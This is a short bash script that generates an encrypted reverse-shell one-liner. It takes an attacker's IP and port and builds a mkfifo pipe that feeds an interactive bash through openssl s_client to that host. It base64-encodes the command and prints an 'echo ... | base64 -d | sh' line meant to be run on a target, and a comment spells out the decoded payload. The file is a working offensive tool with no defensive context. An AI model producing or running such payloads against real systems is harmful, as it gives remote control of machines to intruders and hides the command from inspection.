#!/bin/bash

usage() {
  echo "Usage: $0 [-h] [-s ip:port]"
  echo "  -h             Display this help message"
  echo "  -s ip:port     IP address and port number of the server (e.g., 192.168.1.38:5555)"
}

ip_address=""
port_number=""

while getopts ":hs:" option; do
  case $option in
    h)
      usage
      exit;;
    s)
      if [[ $OPTARG =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{1,5}$ ]]; then
        ip_address=$(echo $OPTARG | cut -d: -f1)
        port_number=$(echo $OPTARG | cut -d: -f2)
      else
        echo "Invalid IP address and port number: $OPTARG" >&2
        usage
        exit 1
      fi;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      usage
      exit 1;;
    :)
      echo "Option -$OPTARG requires an argument." >&2
      usage
      exit 1;;
  esac
done

if [[ -z "$ip_address" || -z "$port_number" ]]; then
  echo "Missing IP address or port number." >&2
  usage
  exit 1
fi

cmd=$(echo "bash -c \"rm -f /tmp/f ; mkfifo /tmp/f ; /bin/bash -i < /tmp/f 2>&1|openssl s_client -quiet -connect ${ip_address}:${port_number} > /tmp/f;rm /tmp/f\"" | base64)
cmd=$(echo $cmd | sed 's/ //g')
echo "echo $cmd | base64 -d | sh"
# bash -c "rm -f /tmp/f ; mkfifo /tmp/f ; /bin/bash -i < /tmp/f 2>&1|openssl s_client -quiet -connect ${ip_address}:${port_number} > /tmp/f;rm /tmp/f"

